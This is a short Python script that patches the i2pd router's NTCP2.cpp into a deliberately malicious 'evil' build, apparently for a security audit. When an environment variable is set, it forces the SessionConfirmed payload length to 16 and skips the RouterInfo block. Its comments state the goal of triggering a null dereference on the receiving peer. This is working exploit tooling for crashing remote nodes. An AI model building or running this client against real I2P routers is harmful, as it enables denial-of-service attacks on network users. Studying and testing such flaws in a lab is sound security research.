#!/usr/bin/env python3
"""NTCP2 evil 补丁 — 用文件内定位而非复制粘贴锚文本(避免输出层转义吞噬)"""
import sys

p = '/home/z/my-project/audit/builds/evil/libi2pd/NTCP2.cpp'
src = open(p).read()
T = '\t'

if 'EVIL_NTCP2_M3P2' in src:
    print('already patched'); sys.exit(0)

# ---- patch 1: m3p2Len = 16 ----
a1 = 'm3p2Len = bufLen + 4 + 16; // (RI header + RI + MAC for now) TODO: implement options\n'
b1 = ('\t\t' + a1 +
      '\t\tif (getenv ("EVIL_NTCP2_M3P2")) // EVIL: m3p2Len=16 -> target vector(0) -> (*buf)[0] null deref\n'
      '\t\t{\n'
      '\t\t\tm3p2Len = 16;\n'
      '\t\t\tLogPrint (eLogWarning, "EVIL: forcing m3p2Len=16");\n'
      '\t\t}\n')
if a1 not in src:
    print('anchor1 missing'); sys.exit(1)
src = src.replace(a1, b1, 1)

# ---- patch 2: MAC-only 模式跳过 RI 填充 ----
i0 = src.find('// create m3p2 payload (RouterInfo block) for SessionConfirmed')
i1 = src.find('riBuffer->data (), bufLen); // TODO: eliminate extra copy', i0)
assert i0 > 0 and i1 > i0, 'anchor2 missing'
i1 += len('riBuffer->data (), bufLen); // TODO: eliminate extra copy')
block = src[i0:i1]
# 在块内插入条件: m3p2 内容填充仅在 >=20 时执行
old_fill_start = block.find('m3p2[0] = eNTCP2BlkRouterInfo')
assert old_fill_start > 0
new_block = (block[:old_fill_start] +
    'if (m3p2Len < 20) // EVIL: MAC-only, skip RI block\n'
    '\t\t{\n'
    '\t\t\tmemset (m3p2, 0, m3p2Len);\n'
    '\t\t}\n'
    '\t\telse\n'
    '\t\t{\n'
    '\t\t' + block[old_fill_start:] + '\n'
    '\t\t}')
src = src[:i0] + new_block + src[i1:]

open(p, 'w').write(src)
print('NTCP2 evil patch OK')
